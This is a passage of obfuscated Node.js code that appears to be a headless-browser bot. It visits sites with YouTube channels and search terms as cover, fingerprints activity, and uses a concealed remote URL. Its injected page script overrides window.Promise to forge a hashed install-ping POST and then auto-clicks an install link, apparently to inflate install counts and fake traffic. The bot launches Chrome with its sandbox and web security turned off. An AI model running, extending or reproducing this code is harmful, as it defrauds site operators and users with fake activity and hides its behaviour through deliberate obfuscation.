0x27f6, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x27f + -0x15 * -0x1af + -0x25ca; J < 0x9da + 0x9 * -0x35 + -0x7ad; ++J)
                K = Q[J - (0x16f9 * -0x1 + -0xbaa + -0x6ee * -0x5)] ^ Q[J - (0x2247 + -0x1a37 * 0x1 + -0x808)] ^ Q[J - (0x3a4 + 0xd3 * -0x1f + 0x15f7 * 0x1)] ^ Q[J - (0x2 * 0x859 + 0x7fd + 0x835 * -0x3)], Q[J] = K << 0x431 + -0x69 * -0x4b + -0x185 * 0x17 | K >>> 0x26f5 + 0xb87 + -0x1 * 0x325d;
              for (J = -0x518 + 0x1 * 0x302 + 0x216; J < -0x1313 * -0x2 + 0xc7c + -0x328e; J += 0x2 * -0xd5a + 0x7 * 0x25f + 0x60 * 0x1b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x6 * -0x623 + 0x3a6 * -0x1 + -0x2127 | L >>> -0x8a7 + -0x13e5 * -0x1 + -0xb23) + (M & N | ~M & O) + P + (-0x611dace6 + 0x1633 * 0x5420b + 0x5221a6 * 0xdd) + Q[J] << -0x6 * -0x5f8 + 0x3b5 + -0x2785) << -0x1d78 + -0x306 + 0x29 * 0xcb | P >>> 0x1 * -0x12dd + -0x12b * -0x7 + 0x133 * 0x9) + (L & (M = M << 0x1d95 + 0x524 + 0x1 * -0x229b | M >>> 0x21b3 + -0xcfc + -0x14b5) | ~L & N) + O + (0x43ccaaf5 + -0x49939271 * 0x2 + 0xa9dcf386) + Q[J + (-0x3 * 0x949 + 0x199c + 0x12 * 0x20)] << -0x1051 + -0xd * 0x137 + -0x224 * -0xf) << 0x766 + 0x1 * -0x4ff + -0x262 | O >>> 0x455 * 0x6 + 0x217b + -0x1bf * 0x22) + (P & (L = L << -0x25fd * 0x1 + -0x3 * 0x1fd + 0x2 * 0x1609 | L >>> -0x1 * -0x2419 + 0x1432 + -0x3849 * 0x1) | ~P & M) + N + (0x60f5b * -0x20a + -0xa8bc0a90 + -0x10f99d3b7 * -0x1) + Q[J + (0x26ca + 0x228a * -0x1 + -0x43e)] << 0x1235 * 0x1 + 0x5 * 0x7c9 + -0x3922) << -0x812 * -0x4 + -0xfee * -0x1 + -0x3031 | N >>> -0x2 * 0xddf + 0x1d * -0x11a + 0x3bcb) + (O & (P = P << 0x23 * -0x9d + -0xd0 * 0x2 + 0x1735 | P >>> -0x4 * 0x2fb + -0x26 * -0xb4 + -0xeca) | ~O & L) + M + (0x8701a1f1 + -0x1277381 * -0x13 + 0x9c01b7 * -0x6d) + Q[J + (0x216a + -0xb4e + -0x1619)] << 0x1 * -0xe47 + -0x1 * -0x48b + 0x9bc) << 0x359 * 0x1 + 0x24a2 + -0x27f6 | M >>> 0x2621 + -0x4 * 0x129 + -0x2162) + (N & (O = O << -0x706 + -0x1241 * 0x2 + 0x25 * 0x12e | O >>> -0xdf * -0x25 + -0x1fc8 + -0x71) | ~N & P) + L + (0x1595231a * 0x2 + 0x7094ffc8 + -0x413ccc63) + Q[J + (-0xda7 + 0x1 * -0x716 + 0x14c1)] << 0xe03 + 0x230a + 0x1b1 * -0x1d, N = N << 0x22b * -0x8 + 0x14e7 + -0x371 | N >>> -0x758 * 0x1 + -0x662 * -0x4 + -0x122e;
              for (; J < -0xd84 + -0x4 * 0x2cd + 0x18e0; J += 0x249b + 0x3c1 + -0x2857)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1e96 + -0x1 * -0x2644 + -0x7a9 * 0x1 | L >>> 0xfc6 + 0x9 * -0x1b0 + -0x7b) + (M ^ N ^ O) + P + (0xb * 0x10b6eab3 + 0x6a9deaf * 0x1f + 0xa5ad1d3 * -0x1b) + Q[J] << 0x1346 + -0xa3d * -0x3 + -0x31fd) << -0x25a1 + 0x3e * 0xe + 0x2242 | P >>> 0x5eb + -0x8cb * -0x2 + -0x1 * 0x1766) + (L ^ (M = M << -0x192f + -0x26c3 + -0xa4 * -0x64 | M >>> 0x954 * -0x1 + -0x18b5 + 0x220b) ^ N) + O + (-0x3248562d + -0xd5783641 + -0x5f8bd * -0x3ebb) + Q[J + (-0xe9b * 0x1 + 0xfee + -0x152 * 0x1)] << -0x1 * -0x252e + 0x3ae * -0x1 + -0x2180) << -0x135e + -0x256f + 0x38d2 | O >>> 0xcc7 * 0x3 + -0x2306 + -0x334) + (P ^ (L = L << -0x1026 + -0x1 * -0x89 + 0xfbb | L >>> -0x94d * -0x2 + 0x1cee + -0x2f86) ^ M) + N + (-0x6bb22669 + -0x31baa7bf + 0x18d1 * 0xacf79) + Q[J + (0x29 * -0xc4 + -0xced + -0x655 * -0x7)] << 0x1753 * -0x1 + 0x2060 + 0x1 * -0x90d) << 0x722 + -0x1ec + -0x531 | N >>> 0x7 * 0x515 + -0xbd9 + 0x1 * -0x179f) + (O ^ (P = P << -0x5 * 0x239 + -0x16dc + 0x1 * 0x2217 | P >>> 0x2 * -0xf3c + 0x1f1 * -0xd + 0x37b7) ^ L) + M + (-0x6d042f0d * -0x1 + 0x470a57ae + 0x169903a * -0x31) + Q[J + (-0x2 * 0xf79 + -0x43 * -0x3e + -0x9 * -0x1a3)] << -0xf + -0x15fa + 0x1609) << 0x13bb * -0x1 + -0x1b0a + 0x2eca | M >>> -0x6 * 0x204 + -0x161 * -0xc + -0x459) + (N ^ (O = O << 0x144 + -0x2 * -0x10b + -0x33c | O >>> 0x156 * -0xd + 0x24e4 + 0x2 * -0x9c2) ^ P) + L + (0x63a6e99 * -0x1b + 0x44f87e8c + -0x2 * -0x69058b9c) + Q[J + (0x1 * 0x387 + 0x72c + 0x223 * -0x5)] << -0x267b + -0x7c4 + 0x1 * 0x2e3f, N = N << 0x35 * 0x49 + 0x42 * 0x94 + -0xb * 0x4d5 | N >>> -0x3 * -0x843 + 0x8d1 + -0x2198;
              for (; J < -0x1 * -0x2303 + 0x261e + -0x48e5; J += 0x8c * -0x33 + -0x967 + 0x2 * 0x12a8)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x19f1 + -0x4 * 0x61f + 0x3272 | L >>> -0x14f3 * -0x1 + -0x49b + -0x103d) + (M & N | M & O | N & O) + P - (0xd392193c + -0x1f28ff6 * -0x1d + -0x9b2824f6) + Q[J] << 0x14f + 0x1 * 0x652 + -0x15 * 0x5d) << 0xd * -0x1f3 + -0x1703 * -0x1 + 0x259 | P >>> -0x23e5 + -0xe40 + 0x10c0 * 0x3) + (L & (M = M << 0x16af * -0x1 + -0x1 * -0xe4b + 0x882 | M >>> -0x6 * 0x16f + 0x1 * 0x8cc + -0x30 * 0x1) | L & N | M & N) + O - (0x2745b * -0x3259 + 0x1 * 0x2f17f436 + 0xbd608891) + Q[J + (0x10fa * -0x1 + -0x521 * 0x1 + 0x161c)] << -0x52f + 0x9cc + -0x1 * 0x49d) << 0x12c2 + -0xe * 0xdf + -0x68b | O >>> 0x21a3 + 0xad4 + 0x11 * -0x29c) + (P & (L = L << -0x1 * -0x6e1 + -0x4b * -0x7e + -0x2bad * 0x1 | L >>> -0x1 * -0x19d + 0x4e7 + 0x11 * -0x62) | P & M | L & M) + N - (-0x1 * -0x7749d662 + 0x3c869d03 + -0x42ec3041) + Q[J + (0x3 * -0xa7 + 0x18cb + -0x16d4)] << -0x6f * 0x43 + -0x189d + 0x35aa) << -0x1 * -0xb1d + 0x1 * -0xb2f + 0x17 * 0x1 | N >>> -0x201f * -0x1 + -0xc07 * 0x2 + 0x2 * -0x3fb) + (O & (P = P << -0x1d1b + 0x21e9 + 0xf0 * -0x5 | P >>> -0x2425 + 0x1 * -0x3a9 + 0x27d0) | O & L | P & L) + M - (0x2 * -0x5f93737f + -0x2b239560 + -0x39dd1feb * -0x6) + Q[J + (-0x395 * 0x4 + -0x17f2 + 0xb * 0x37b)] << -0xa52 * -0x1 + 0x429 + -0xe7b) << -0x12e * 0x15 + 0x1047 + 0x221 * 0x4 | M >>> 0x1218 + -0x17 * -0x10d + 0x2a28 * -0x1) + (N & (O = O << -0x6e * 0x35 + -0x1 * -0x551 + -0x199 * -0xb | O >>> -0x2665 + -0x1799 * -0x1 + 0xece) | N & P | O & P) + L - (-0x68213711 + -0xb68edd71 + 0xffbb196 * 0x19) + Q[J + (-0x1aa3 + 0x471 + 0x2 * 0xb1b)] << 0x128a + 0x1fcc + -0x11 * 0x2f6, N = N << 0x2e7 * -0x5 + -0x1785 + 0x2626 * 0x1 | N >>> 0x134f + 0x121 * 0x11 + -0x267e;
              for (; J < 0x453 + -0x25 * -0x11 + 0x45 * -0x18; J += 0x1025 + -0x1 * -0xbda + 0x2 * -0xdfd)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2f9 * 0x4 + 0x1094 + -0x1c73 * 0x1 | L >>> 0xc75 * 0x2 + -0x19fb + 0x14 * 0xf) + (M ^ N ^ O) + P - (-0x1c5b70 * 0x1f0 + -0x35e04601 + -0x1c0a21 * -0x5cb) + Q[J] << 0x2383 + -0x89 + -0x32e * 0xb) << -0x256c + 0x1c64 + -0x1 * -0x90d | P >>> 0x1f27 + -0x20ad + 0x1 * 0x1a1) + (L ^ (M = M << -0xe21 * -0x1 + -0x329 + 0x39e * -0x3 | M >>> 0x16 * -0x19b + 0xe3c + 0x1518) ^ N) + O - (-0x337f9bca + -0x59 * 0x5129f + 0x7127 * 0xf1cd) + Q[J + (-0x261c + 0x261f + -0x2 * 0x1)] << -0x4d5 * -0x1 + -0x2259 + 0x1d84) << 0xd * 0x25f + -0xdaf + 0x5b5 * -0x3 | O >>> 0x49 * -0xb + -0x25d8 * 0x1 + 0x2916) + (P ^ (L = L << 0xb99 + -0x2278 * -0x1 + -0x2df3 | L >>> 0x62 * -0x28 + 0x1a95 + -0x3 * 0x3c1) ^ M) + N - (0x466b3885 + 0x2108bb0b + -0x42 * 0xc15053) + Q[J + (0x10eb + 0xfc5 * 0x1 + -0x20ae)] << -0x1773 + -0x2 * 0xeed + 0x354d) << -0x18c9 + 0x74f + 0x117f | N >>> 0x12 * -0x17b + -0x227b + 0x3d3c) + (O ^ (P = P << -0x1765 + 0x20a2 * -0x1 + 0x3825 | P >>> 0xd35 + -0x182 + 0x29 * -0x49) ^ L) + M - (0x27c3b * -0x5c5 + 0x4ba2f65a * 0x1 + -0x7aef7c9) + Q[J + (0x1a58 + 0x1048 + -0x2a9d * 0x1)] << 0x1 * 0x581 + -0x231f + 0x1d9e) << 0xb53 + -0x1efd * -0x1 + -0x2a4b | M >>> -0x2271 * -0x1 + 0x26fc + -0x4952) + (N ^ (O = O << -0x1e * 0x12e + 0x141c * 0x1 + 0x9 * 0x1b6 | O >>> -0x53 * 0x3d + 0x1047 + 0x382) ^ P) + L - (0x1 * -0x478cdcdd + -0xaf * -0x88214b + 0x74b * 0x46706) + Q[J + (0x1 * 0xb4d + 0x1965 + -0x1e * 0x139)] << 0x24cb * -0x1 + 0x1225 + 0x12a6, N = N << -0xe3 * 0x2b + 0x4 * 0x52 + -0x1 * -0x24f7 | N >>> 0x4 * 0x5 + 0x3 * 0x52e + 0x3 * -0x534;
              this['h0'] = this['h0'] + L << -0xfa7 + -0x1ee1 * 0x1 + 0x2e88, this['h1'] = this['h1'] + M << -0x154e + -0x1c58 + -0x136 * -0x29, this['h2'] = this['h2'] + N << -0x918 + -0x182 * 0xe + 0x1e34, this['h3'] = this['h3'] + O << 0x7 * -0x377 + -0x537 + 0x1d78, this['h4'] = this['h4'] + P << 0x12f * -0x19 + 0xaad * -0x2 + 0x32f1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x2 * -0xbbf + 0x256a + -0x3ccc & -0x1ce8 + 0x1056 + 0xca1] + w[J >> -0x22a9 + 0xd7d + 0x1544 & 0x1 * -0x4d6 + -0x12c + 0x611] + w[J >> -0x2608 + -0x1 * 0x25e9 + 0x4c05 & -0x1 * -0x86b + -0x1b0e + -0x12b2 * -0x1] + w[J >> -0x189 + -0x14dd + 0x1676 * 0x1 & -0x873 + -0xfdf + 0x1861] + w[J >> 0x3b * 0x6a + 0x418 * 0x9 + -0x3d3a & -0x219d * 0x1 + 0x21b8 + -0x3 * 0x4] + w[J >> 0xfe5 + -0x159c + 0x5bf & 0x1606 + -0x12ea + 0x47 * -0xb] + w[J >> -0x34f + 0x1 * -0x932 + 0xc85 & 0x251e * -0x1 + -0xb * -0x167 + 0x74 * 0x30] + w[0x179 + -0x1 * -0x919 + -0x3 * 0x381 & J] + w[K >> -0x7a5 * -0x2 + 0x1 * 0x14cf + -0x3 * 0xbff & 0x8 * -0x35e + -0xe1b + 0x291a] + w[K >> -0x19bc * 0x1 + -0x22ad + 0x3c81 & 0x562 + 0x26af + -0x2c02 * 0x1] + w[K >> -0x1868 + -0x33d + 0x1bb9 & -0xc8e * 0x1 + -0x1 * -0xb8c + 0x5b * 0x3] + w[K >> -0x870 + -0x2f1 + -0xb71 * -0x1 & 0x598 + 0x2234 + -0x3 * 0xd3f] + w[K >> -0xc4 + 0x8f * -0x3a + 0xda * 0x27 & 0xfb1 + 0x1b2a + -0xf9 * 0x2c] + w[K >> 0x244 + 0x7f * 0x17 + -0xda5 & 0x803 + -0x975 * -0x4 + -0x2dc8] + w[K >> 0x4e3 + -0x3bd + -0x122 & 0x3e2 + 0x2 * -0xfe3 + -0x597 * -0x5] + w[0x2191 + 0x1f4c + -0x40ce & K] + w[L >> -0x1c98 + -0x61f + 0x22d3 & 0x1773 + 0xa66 * -0x2 + 0x14c * -0x2] + w[L >> -0x154c + 0x103c * -0x2 + 0x35dc & -0x42 * 0x21 + 0xa7 * 0x37 + -0x1b50] + w[L >> 0x16af + -0xd7b + -0x920 & 0x7d2 + -0xc9 * -0x25 + 0x1268 * -0x2] + w[L >> 0x45 * -0x28 + -0x1804 + 0x22dc & -0x4ea * 0x6 + -0x2 * -0x1021 + -0x8b * 0x5] + w[L >> 0x1 * 0x5b1 + 0x6 * -0x425 + 0x1339 & 0x38 * -0x89 + 0x8d * -0x37 + 0x3c52] + w[L >> -0x603 * 0x4 + -0x1cf * -0x7 + 0xb6b & 0x108b + 0xfc5 * -0x1 + 0x1 * -0xb7] + w[L >> 0x62 * 0x57 + 0x3a * 0xa7 + 0x2390 * -0x2 & -0x3 * 0x815 + -0x3fb + 0x1c49] + w[0x267d + 0x26d * 0x4 + -0x1811 * 0x2 & L] + w[M >> -0x2e8 + 0xb13 + -0x80f & -0x2152 + 0x12a * -0xf + -0x89 * -0x5f] + w[M >> 0x11ef + -0x2247 + 0x10 * 0x107 & -0x105f * 0x1 + 0x18 * -0x8e + 0x1dbe] + w[M >> 0x250 * 0x4 + -0xde9 * 0x1 + 0x1 * 0x4bd & 0x1f6f + 0x975 + -0x28d5] + w[M >> -0x1b3f + 0x1 * -0x236 + 0x1d85 & 0x133 * 0x3 + 0x1 * 0x13c8 + -0x1752] + w[M >> -0x1020 + -0xc * 0x50 + 0x19 * 0xcc & 0x25f5 + 0x5 * -0x443 + -0x1097] + w[M >> 0x878 * 0x4 + -0x194 * -0x8 + -0x8 * 0x5cf & -0x34d + 0x1be2 + 0x1886 * -0x1] + w[M >> 0x1ff5 + 0x7 * -0x313 + -0x74 * 0x17 & -0x1d9 + 0x10d8 + 0x1 * -0xef0] + w[0x1 * -0x123d + -0x17f * 0x9 + -0x2f * -0xad & M] + w[N >> -0x181d + 0x226 * 0x7 + 0x1 * 0x92f & -0xeca * -0x1 + -0x21ab + 0x12f0] + w[N >> -0x25ea + -0x120e + -0x27 * -0x170 & -0x11 * -0x4d + 0xf * -0x1e5 + -0x175d * -0x1] + w[N >> -0x191e * -0x1 + -0x1f3 * 0xd + 0x4d & -0x247d + 0x855 + -0xe9 * -0x1f] + w[N >> 0x1 * -0x251 + -0x2a2 + 0x1 * 0x503 & 0x985 * -0x4 + 0x254d + -0x2 * -0x6b] + w[N >> -0x1247 * -0x1 + -0x7ee + -0xa4d & 0x210d * -0x1 + 0x1 * -0x1547 + -0x3 * -0x1221] + w[N >> -0x3f5 * 0x1 + 0xd5b + -0x2 * 0x4af & -0x3f1 + 0x2214 + -0x181 * 0x14] + w[N >> 0x1 * -0xa3c + -0x7 * -0x4e3 + -0x17f5 & 0x3 * -0x3cb + -0x10e2 + 0x122 * 0x19] + w[-0x1925 + 0x1163 + 0x7d1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1 * -0x1883 + -0x6b4 + 0x1f4f & -0x1a8e + -0x2242 + -0x3dcf * -0x1,
                J >> 0x205 * -0x2 + -0x102f + 0x1 * 0x1449 & -0x1 * 0x1ea9 + -0x1f5e + -0x1502 * -0x3,
                J >> -0x615 + 0x94a + -0x32d & -0x1d35 + -0x204a + -0x34a * -0x13,
                -0x571 * 0x6 + 0x4 * 0x390 + 0x1365 & J,
                K >> 0x19c6 + 0x2053 + 0x3a01 * -0x1 & -0x1e46 + 0x6fc + 0x1849 * 0x1,
                K >> -0x842 + -0x1705 + -0x71 * -0x47 & -0x93 * 0x3c + -0x1c7 + 0x253a,
                K >> -0xc9f + 0x2046 + -0x139f & -0x2f * -0x67 + 0x11ba + -0x23a4,
                0x1367 + -0xc92 + -0x5d6 & K,
                L >> 0x1 * 0x1e02 + 0x59 * -0x51 + 0x1 * -0x1c1 & 0x2512 + -0x1310 + -0xd * 0x14f,
                L >> -0x1195 + -0x1b1b + 0x2cc0 & 0x319 * -0x8 + 0x1 * -0xd03 + -0x1365 * -0x2,
                L >> -0x6e2 * -0x3 + 0x22 * 0x44 + -0x1da6 & 0x4e * 0x2b + -0x1c2 * -0xf + -0x2679,
                0xf1e + 0x2d3 * -0x5 + 0x0 & L,
                M >> -0x1 * -0x162d + -0x381 * -0x4 + -0x2419 & -0x222b + 0x20 * -0xaa + -0x3 * -0x12ce,
                M >> 0x1500 + 0xb9 * 0xc + -0x1d9c & 0x687 + -0x24ba * -0x1 + -0x2 * 0x1521,
                M >> 0x99 * 0x5 + -0x1295 + 0xfa0 & 0x8b * 0x7 + -0xfa1 + 0xcd3,
                -0x111b + 0x1421 + -0x3 * 0xad & M,
                N >> -0x1 * -0x1a3b + -0xb3b + -0xee8 & 0x89 * 0x43 + 0x18 * 0x61 + -0x2bf4 * 0x1,
                N >> 0x1a19 + 0x1527 + -0x2f30 & -0x402 * -0x9 + 0x8 * 0x189 + -0x2f5b,
                N >> -0x3 * -0x179 + 0x2662 + 0x2ac5 * -0x1 & 0xd * -0x2fe + 0x29 * -0x1f + 0x2cdc,
                -0x1 * -0x25be + 0x18d1 + -0xc5 * 0x50 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x5f7 + -0x2 * 0xa55 + 0xec7), (K = new DataView(J))['setUint32'](0x2173 + -0x1d6f + 0x2 * -0x202, this['h0']), K['setUint32'](-0x599 * 0x1 + -0x13a3 + -0x10 * -0x194, this['h1']), K['setUint32'](-0x1fe4 + -0x3 * -0x9ac + 0x5d * 0x8, this['h2']), K['setUint32'](0x2 * 0x12f5 + -0x1a73 + -0xb6b, this['h3']), K['setUint32'](0x2 * -0x809 + 0xa5 + 0xf7d, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x257 + 0x938 + -0x6e1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1 * -0x13b8 + 0x1 * 0xe64 + -0x221c;
            J[-0x567 + -0xca3 + 0x120a]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x6b5 * 0x1 + -0x1971 + 0x12bc] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x22 * -0x93 + 0x2f8 + -0x12f * 0x13), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x2231 + 0x1398 + 0xe9a;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0xb8c + -0xdee + -0x3 * -0xa72), Promise['resolve'](-0x12a3 * -0x1 + -0x908 + -0x99a);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x152b * 0x1 + 0x1aa7 + -0x2fd2; j < 0x1dcb * 0x1 + -0x14e6 + -0x4 * 0x239; j++)
    i();
}
const NETWORK_PATIENCE = -0x25dd + -0x12ff * 0x2 + 0x6b1b + (-0xfbe + 0xc1 * -0x8 + 0xb2a * 0x3) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0xe5 * 0x18 + 0xaef + -0xc * -0xe1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + V(0x11) + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function a() {
  const bo = [
    'W5ZcMmoCwCkXn8kpoeLo',
    'WQddI8kPW4ZdTrPYW5lcTru',
    'https://me',
    'CMCVzw4VC2nYAq',
    'idToWatch',
    'zs9TB29TB28UAq',
    'oer1sJncqxDnrq',
    'zwfZEwzVCMSUBW',
    'erContext',
    'C3mTyMfY',
    'x05prevFsLm',
    'easyfork.o',
    '\x20(KHTML,\x20l',
    'WPNdQ8o4ENBcGJ5Qb0a',
    'e/youtube.',
    'W7yjWOTsWONdQ8oXaCkIW5a',
    'WOW64)\x20App',
    'CMSUz2XPDgnOlG',
    'tw96AwXSys81lG',
    'DMfUAwXSyuXHDq',
    's\x20韓国語,bts\x20',
    'AgfYzgnVCMuSAa',
    'ntent-deli',
    'enuserjs.o',
    'l2fZzhnHzhDXza',
    'bJ9MWRPqAb9iWOZdUq'
  ];
  a = function() {
    return bo;
  };
  return a();
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x7eb + -0x1c1f + 0x6 * 0x35e; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0xc8b + -0x2 * -0xa69 + 0xb1f * -0x3);
    let h = e[f];
    if (b['jlsRYZ'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x7 * -0x50 + -0x1 * -0x1ac1 + -0x1891, s, t, u = 0xccb + 0x8b * -0x1 + -0xc40; t = n['charAt'](u++); ~t && (s = r % (-0x1 * -0x3ad + 0x7 * -0x31f + -0x308 * -0x6) ? s * (-0x23 * -0x110 + -0x17d7 + 0x7 * -0x1df) + t : t, r++ % (-0xfb * 0x13 + -0x5b * 0x51 + 0x170 * 0x21)) ? p += String['fromCharCode'](-0x2137 + -0x9fe + 0x2c34 & s >> (-(0xab0 + 0xaa * -0xb + 0x36 * -0x10) * r & -0x910 + -0xcb1 + 0x15c7)) : 0x2134 + 0x16e8 + 0xe4 * -0x3f) {
          t = o['indexOf'](t);
        }
        for (let v = -0x596 + -0x1830 + 0x25 * 0xce, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0xaa0 + -0x6 * -0x45b + -0x24b2))['slice'](-(-0x4d6 * 0x4 + 0x13 * -0x110 + -0x1 * -0x278a));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1 * -0xcd7 + 0x89 * 0x13 + 0x2ac,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x423 + 0xa16 * 0x1 + 0xe39 * -0x1; u < 0x1083 + -0x10 * 0x254 + 0x69 * 0x35; u++) {
          p[u] = u;
        }
        for (u = -0x1 * -0x139f + 0x25da + 0x3979 * -0x1; u < 0x4 * 0x577 + -0xb * -0x317 + -0x2e3 * 0x13; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1e31 + -0x159f + -0xa90 * -0x5), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1433 * -0x1 + 0x185e * 0x1 + 0x61 * -0xb, q = 0x162e + -0x22ae + 0xc8 * 0x10;
        for (let v = -0x5ce * 0x6 + 0x57 * -0x21 + 0x2e0b; v < n['length']; v++) {
          u = (u + (-0x1 * 0x13bb + -0x1529 + -0x13 * -0x227)) % (0xa8d + 0x1 * -0x2477 + -0x5 * -0x562), q = (q + p[u]) % (0x5 * -0x3df + -0xe32 + -0x1 * -0x228d), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x2a2 + -0x12f8 + 0x1156)]);
        }
        return t;
      };
      b['KISoMg'] = m, c = arguments, b['jlsRYZ'] = !![];
    }
    const j = e[-0xfe5 * -0x1 + 0x67 * -0x6 + -0xd7b],
      k = f + j,
      l = c[k];
    return !l ? (b['TZUSLT'] === undefined && (b['TZUSLT'] = !![]), h = b['KISoMg'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 